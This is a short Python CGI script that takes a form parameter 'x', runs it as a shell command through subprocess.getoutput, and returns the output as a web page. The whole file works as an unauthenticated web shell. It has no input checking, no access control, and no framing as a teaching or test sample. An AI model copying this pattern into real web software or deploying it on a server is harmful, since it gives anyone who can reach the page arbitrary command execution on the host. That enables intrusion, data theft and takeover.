#! /usr/bin/python3

print("content-type: text/html")
print()


import cgi
import subprocess as sp
form = cgi.FieldStorage()
cm=""
output=""
cm = form.getvalue("x")
output = sp.getoutput(cm) 
#print(cm)
print(output)

